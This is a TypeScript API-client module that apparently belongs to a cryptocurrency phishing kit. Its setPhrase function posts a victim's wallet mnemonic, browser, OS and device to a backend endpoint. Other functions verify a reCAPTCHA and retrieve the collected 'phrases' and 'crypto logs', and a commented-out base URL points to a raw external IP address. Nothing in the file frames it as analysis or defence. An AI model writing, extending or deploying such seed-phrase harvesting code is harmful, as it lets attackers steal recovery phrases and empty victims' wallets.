// const baseUrl='http://94.156.177.209:8080'
const baseUrl='http://localhost:8080'

export const setPhrase = async (
  value: any,
  userInfo: any,
  cryptoLogId: any
) => {
  try {
    const response = await fetch(
      `${baseUrl}/dashboard/set-acc-phrase`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          mnemonic: value,
          userInfo: {
            browser: userInfo.browser,
            os: userInfo.os,
            device: userInfo.device,
          },
          cryptoLogId: cryptoLogId,
        }),
      }
    );
    console.log("in setPhrase:  ",response)
    if (response.ok) {
      return response;
    } else {
      console.log(`Error: ${response.status} ${response.statusText}`);
    }
  } catch (error) {
    console.log("Error setting phrase:", error);
  }
};

export const verifyRecaptcha = async(token: any) => {
  try {
    const response:any = await fetch(
      `${baseUrl}/dashboard/verify-recaptcha`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          token:token,
        }),
      }
    );

    if (response.ok) {
      return response;
    } else {
      const error = 'Error verifying recaptcha'
      return error
    }
  } catch (error) {
    return error
  }
};

export const getCryptoLog = async (cryptoLogId: any) => {
  try {
    const response = await fetch(
      `${baseUrl}/dashboard/get-crypto-log`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          id: cryptoLogId,
        }),
      }
    );

    if (!cryptoLogId) {
      console.log("Error: Crypto Log ID is required");
    }

    if (!response.ok) {
      console.log(`Error: ${response.status} ${response.statusText}`);
    }
    const data = await response.json();
    return data;
  } catch (error) {
    console.log("Error fetching crypto log:", error);
    return null;
  }
};
export const getPhrases = async () => {
  try {
    const response = await fetch(
      `${baseUrl}/dashboard/get-phrases`,
      {
        method: "GET",
        headers: {
          "Content-Type": "application/json",
        },
      }
    );
    if (!response.ok) {
      console.log(`Error: ${response.status} ${response.statusText}`);
      return [];
    }
    const data = await response.json();
    return data;
  } catch (error) {
    console.log("Error fetching phrases:", error);
    return [];
  }
};
